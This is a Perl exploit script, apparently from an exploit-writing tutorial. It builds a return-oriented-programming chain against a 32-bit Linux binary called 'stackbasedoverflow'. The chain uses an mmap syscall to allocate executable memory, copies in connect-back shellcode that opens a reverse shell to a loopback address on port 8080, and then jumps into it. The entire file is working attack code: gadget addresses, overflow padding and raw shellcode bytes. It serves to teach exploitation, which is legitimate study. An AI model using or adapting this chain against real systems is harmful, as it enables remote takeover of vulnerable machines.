#!/usr/bin/perl

#####################################################################
############ Date: September 18 2015
############ Author: Vincent Dary
############ File: rop_chain_1.pl
############
############ Architecture: Intel x86
############ Plateform: GNU/Linux 32 bits
############
############ Description: 
############ Exploit Writing Tutorial,
############ memory allocator + shellcode loader + shellcode caller
############ variant based on mmap syscall 0x5a.
#####################################################################

use strict;
use warnings;

my $binary_name = "stackbasedoverflow";
my $padding_overflow = 524;
my $buffer = "";

my $ffffffff = "\xff\xff\xff\xff";

# @data section
my $data_section_offset0 = "\x3c\xc5\x0e\x08";
my $data_section_offset1 = "\x40\xc5\x0e\x08";  # .data = 0x080ec540
my $data_section_offset2 = "\x44\xc5\x0e\x08";
my $data_section_offset3 = "\x48\xc5\x0e\x08";
my $data_section_offset4 = "\x4c\xc5\x0e\x08";
my $data_section_offset5 = "\x50\xc5\x0e\x08";

# connect-back shellcode 
# to 127.01.01.01 port 8080
my  @shellcode = ("\x31\xc0\xb0\xa4", "\x31\xdb\x31\xc9", "\x31\xd2\xcd\x80", "\x6a\x66\x58\x31",
                  "\xdb\x43\x99\x52", "\x6a\x01\x6a\x02", "\x89\xe1\xcd\x80", "\x96\x6a\x66\x58",
                  "\x43\x68\x7f\x01", "\x01\x01\x66\x68", "\x1f\x90\x66\x53", "\x89\xe1\x6a\x10",
                  "\x51\x56\x89\xe1", "\x43\xcd\x80\x87", "\xf3\x6a\x02\x59", "\xb0\x3f\xcd\x80",
                  "\x49\x79\xf9\xb0", "\x0b\x52\x68\x2f", "\x2f\x73\x68\x68", "\x2f\x62\x69\x6e",
                  "\x89\xe3\x52\x89", "\xe2\x53\x89\xe1", "\xcd\x80\x90\x90");

# gadgets
my $pop_eax =               "\x26\x95\x0b\x08";  # 0x080b9526 : pop eax ; ret
my $pop_edx =               "\x4a\xed\x06\x08";  # 0x0806ed4a : pop edx ; ret
my $pop_ebx =               "\xa9\x81\x04\x08";  # 0x080481a9 : pop ebx ; ret
my $pop_ecx =               "\xdf\xb9\x0d\x08";  # 0x080db9df : pop ecx ; ret
my $pop_edi =               "\x80\x84\x04\x08";  # 0x08048480 : pop edi ; ret
my $inc_edx =               "\xf7\xc9\x05\x08";  # 0x0805c9f7 : inc edx ; ret
my $inc_ecx =               "\xad\x88\x0d\x08";  # 0x080d88ad : inc ecx ; ret
my $dec_eax =               "\x93\x37\x06\x08";  # 0x08063793 : dec eax ; ret
my $xor_eax_eax =           "\x43\x8f\x04\x08";  # 0x08048f43 : xor eax, eax ; ret
my $add_eax_ecx =           "\xf0\x81\x06\x08";  # 0x080681f0 : add eax, ecx ; ret
my $mov_eax_edx =           "\xd9\x4e\x05\x08";  # 0x08054ed9 : mov eax, edx ; ret
my $mov_aedx_eax =          "\x6b\x42\x05\x08";  # 0x0805426b : mov dword ptr [edx], eax ; ret
my $mov_aeax4_edx =         "\x42\x31\x05\x08";  # 0x08053142 : mov dword ptr [eax + 4], edx ; ret
my $mov_aeax_edx =          "\x42\x31\x05\x08";  # 0x08053142 : mov dword ptr [eax + 4], edx ; ret
my $int_80 =                "\x90\xf4\x06\x08";  # 0x0806f490 : int 0x80 ; ret
my $add_eax_aedi_call_eax = "\x46\x72\x09\x08";  # 0x08097246 : add eax, dword ptr [edi] ; call eax
my $sub_edx_eax__mov_eax_edx__sar_eax_0x10 = "\xe3\xc5\x09\x08";  # 0x0809c5e3 : sub edx, eax ; mov eax, edx ; sar eax, 0x10 ; ret

# gadget use for debug
my $nop =                   "\x0f\x2f\x05\x08";  # 0x08052f0f : nop ; ret

# set the stack padding overflow
$buffer  =  'A' x $padding_overflow;


#********************
# memory allocator
#********************

# mmap(0, sizeof(shellcode), PROT_EXEC | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

# mmap syscall arguments passed by a pointer to a structure, because:

#  arch/x86/ia32/sys_ia32.c
# 
# /*
# * Linux/i386 didn't use to be able to handle more than
# * 4 system call parameters, so these system calls used a memory
# * block for parameter passing..
# */
#
# struct mmap_arg_struct32 {
#    unsigned int addr;
#    unsigned int len;
#    unsigned int prot;
#    unsigned int flags;
#    unsigned int fd;
#    unsigned int offset;
# };

# arg1 : unsigned long addr = 0
$buffer .= $pop_edx;                                # edx = 0xffffffff
$buffer .= $ffffffff;
$buffer .= $inc_edx;                                # edx = 0x00000000
$buffer .= $pop_eax;                                # eax = @data - 4
$buffer .= $data_section_offset0;   
$buffer .= $mov_aeax_edx;                           # [@data] = 0x00000000

# arg2 : unsigned long len = sizeof(shellcode)
$buffer .= $pop_eax;                                # eax = 0xfffffff9
$buffer .= "\x9f\xff\xff\xff";
$buffer .= $pop_edx;                                # edx = 0xffffffff             
$buffer .= $ffffffff;
$buffer .= $sub_edx_eax__mov_eax_edx__sar_eax_0x10; # edx = 0x00000060
$buffer .= $pop_eax;                                # edx = @data
$buffer .= $data_section_offset1;   
$buffer .= $mov_aeax_edx;                           # [@data + 4] = 0x00000060

# arg3 : unsigned long prot = PROT_EXEC|PROT_WRITE
$buffer .= $pop_edx;                                # edx = 0xffffffff
$buffer .= $ffffffff;
$buffer .= $inc_edx x 7;                            # edx = 0x00000006
$buffer .= $pop_eax;                                # edx = @data + 4
$buffer .= $data_section_offset2;   
$buffer .= $mov_aeax_edx;                           # [@data + 8] = 0x00000006

# arg4 : unsigned long flags = MAP_ANONYMOUS|MAP_PRIVATE
$buffer .= $pop_eax;                                # eax = 0xffffffdd
$buffer .= "\xdd\xff\xff\xff";
$buffer .= $pop_edx;                                # edx = 0xffffffff
$buffer .= $ffffffff;
$buffer .= $sub_edx_eax__mov_eax_edx__sar_eax_0x10; # edx = 0x00000034
$buffer .= $pop_eax;                                # edx = @data + 8
$buffer .= $data_section_offset3;   
$buffer .= $mov_aeax_edx;                           # [@data + 12] = 0x00000022

# arg5 : unsigned long fd = -1
$buffer .= $pop_edx;                                # edx = 0xffffffff
$buffer .= $ffffffff;
$buffer .= $pop_eax;                                # edx = @data + 12
$buffer .= $data_section_offset4;   
$buffer .= $mov_aeax_edx;                           # [@data + 16] = 0xffffffff

# arg6 : unsigned long offset = 0
$buffer .= $pop_edx;                                # edx = 0xffffffff
$buffer .= $ffffffff;
$buffer .= $inc_edx;                                # edx = 0x00000000
$buffer .= $pop_eax;                                # edx = @data + 16
$buffer .= $data_section_offset5;   
$buffer .= $mov_aeax_edx;                           # [@data + 20] = 0x00000000

# set ebx and eax to perform the mmap syscall
$buffer .= $pop_eax;                                # eax = 0xffffffdd
$buffer .= "\xa5\xff\xff\xff";
$buffer .= $pop_edx;                                # edx = 0xffffffff
$buffer .= $ffffffff;
$buffer .= $sub_edx_eax__mov_eax_edx__sar_eax_0x10; # edx = 0x0000005a
$buffer .= $mov_eax_edx;                            # eax = 0x0000005a
$buffer .= $pop_ebx;                                # ebx = @data
$buffer .= $data_section_offset1;

# perform the mmap syscall 
$buffer .= $int_80;                                 # eax = @new_executable_memory


#********************
# shellcode loader
#********************

# save @new_executable_memory on @data
$buffer .= $pop_edx;				                        # edx = @data
$buffer .= $data_section_offset1;
$buffer .= $mov_aedx_eax;			                      # [@data] = @new_executable_memory

$buffer .= $pop_ecx;                                # ecx = 0xffffffff
$buffer .= $ffffffff;
$buffer .= $inc_ecx x 5;                            # ecx = 0x00000004

$buffer .= $dec_eax x 4;                            # eax = @new_executable_memory - 4
$buffer .= $pop_edx;                                # edx = "\x31\xc0\xb0\xa4"
$buffer .= $shellcode[0];
$buffer .= $mov_aeax4_edx;                          # [@new_executable_memory] = "\x31\xc0\xb0\xa4"

for (my $i = 1; $i < 23; $i++)
{
	$buffer .= $add_eax_ecx;                          # eax = @new_executable_memory + 4 + (4 x $i)
	$buffer .= $pop_edx;                              # edx = $shellcode[$i]
	$buffer .= $shellcode[$i];
	$buffer .= $mov_aeax4_edx;                        # [@new_executable_memory + $i] = $shellcode[$i]
}


#********************
# shellcode caller
#********************

$buffer .= $pop_edi;                                # edi = @data
$buffer .= $data_section_offset1;                      
$buffer .= $xor_eax_eax;                            # eax = 0x00000000
$buffer .= $add_eax_aedi_call_eax;                  # eax = @new_executable_memory


print $buffer;










